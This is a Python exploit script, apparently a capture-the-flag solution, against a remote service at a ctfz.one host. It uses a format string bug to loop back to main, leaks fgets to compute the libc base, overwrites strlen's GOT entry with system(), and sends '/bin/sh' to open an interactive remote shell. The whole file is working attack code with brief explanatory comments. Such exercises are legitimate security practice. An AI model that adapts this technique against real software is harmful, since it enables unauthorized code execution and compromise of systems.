import struct
import socket
import telnetlib

def tcp_connect(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))

	return s

def recv_until(s, string):
	received = ""

	while string not in received:
		received += s.recv(1)

	return received

def telnet_interact(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

s = tcp_connect("pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one", 1234)

#raw_input("Press enter to continue...")

s.send("3\n")

#write to the next instruction after printf to make it jmp to main so that we get a loop and are able to use the format string bug multiple times
#we also leak libc fgets to calculate libc base

format_string = "%23$n%114665x%24$n%25$x%25$s".ljust(60, "X") + struct.pack("I", 0x80489b8) + struct.pack("I", 0x80489b4) + struct.pack("I", 0x804b01c)

s.send(format_string + "\n")

s.send("0\n")

response = recv_until(s, "XXXXXX").split("XXXXXX")[0]

libc_fgets = struct.unpack("I", response.split("0804b01c")[1][:4])[0]
libc = libc_fgets - 0x5e150 #0x5d620
libc_system = libc + 0x3ada0 #0x3a940

print hex(libc)
print hex(libc_system)

#overwrite strlen got with libc system

s.send("3\n")

libc_system_left_half = libc_system >> 16
libc_system_right_half = libc_system & 0xffff

if libc_system_left_half < libc_system_right_half:
	format_string = ("%" + str(libc_system_left_half) + "x%23$hn%" + str(libc_system_right_half - libc_system_left_half) + "x%24$hn").ljust(60, "X") + struct.pack("I", 0x804b034 + 2) + struct.pack("I", 0x804b034)
else:
	format_string = ("%" + str(libc_system_right_half) + "x%23$hn%" + str(libc_system_left_half - libc_system_right_half) + "x%24$hn").ljust(60, "X") + struct.pack("I", 0x804b034) + struct.pack("I", 0x804b034 + 2)

s.send(format_string + "\n")

s.send("0\n")

#using strlen on string /bin/sh to get system(/bin/sh)

s.send("1\n")

s.send("/bin/sh\n")

telnet_interact(s)
